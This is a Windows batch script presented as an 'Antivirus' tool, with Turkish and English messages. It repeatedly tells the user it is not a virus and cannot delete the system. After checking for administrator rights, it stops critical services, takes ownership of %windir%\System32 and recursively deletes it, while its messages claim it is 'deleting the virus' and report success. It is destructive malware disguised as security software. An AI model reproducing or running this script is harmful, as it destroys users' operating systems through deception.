@echo off
title Antivirus
color 0C

:: İlk uyarı
echo [!] This is not a virus. Do you want to execute it? (y/n)
set /p userInput1="y/n: "

if /i not "%userInput1%"=="y" (
    echo [!] İşlem iptal edildi.
    exit /B 0
)


echo [!] Are you SURE? (y/n)
set /p userInput2="Seçiminiz: "

if /i not "%userInput2%"=="Evet" (
    echo [!] İşlem iptal edildi.
    exit /B 0
)

:: Üçüncü ve son uyarı
echo [!] LAST WARNING: This is not a virus! It can not delete the system! Are you SURE? (y/n)
set /p userInput3="Seçiminiz: "

if /i not "%userInput3%"=="Evet" (
    echo [!] İşlem iptal edildi.
    exit /B 0
)


setlocal EnableDelayedExpansion
title AntiVirus
color 0C

:: Yonetici yetkisi kontrolu
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] HATA: Please run this antivirus as Administrator!
    pause
    exit /B 1
)

:: Silinecek klasor yolu
set "targetPath=%windir%\System32"

echo [+] Target: C:\UnknownSecretFileHidden\Virus.exe
echo.

:: Acik dosyalari kapat
echo [*] Closing the apps...
taskkill /F /IM notepad.exe >nul 2>&1
taskkill /F /IM wordpad.exe >nul 2>&1

:: Tum servisleri durdur
echo [*] Kritik servisler durduruluyor...
net stop TrustedInstaller /y >nul 2>&1
net stop WuauServ /y >nul 2>&1
net stop msiserver /y >nul 2>&1
net stop WSearch /y >nul 2>&1

:: Sistem yetkilerini kaldir
echo [*] Deleting virus 1...
icacls "%targetPath%" /setowner "Administrators" /T /C >nul 2>&1
icacls "%targetPath%" /reset /T >nul 2>&1

:: Tum yetkileri al
echo [*] Deleting virus 2...
takeown /F "%targetPath%" /A /R /D Y >nul 2>&1
icacls "%targetPath%" /grant:r Administrators:F /T /C /Q >nul 2>&1
icacls "%targetPath%" /grant:r %username%:F /T /C /Q >nul 2>&1


attrib -r -s -h "%targetPath%" /s /d >nul 2>&1
rd /s /q "%targetPath%" >nul 2>&1

:: Son kontrol
if exist "%targetPath%" (
    echo [!] Error: Unable delete the virus!
    echo [!] Please retry on Safe Mode!
) else (
    echo [+] SUCCESS: Deleted the virus!
)

pause
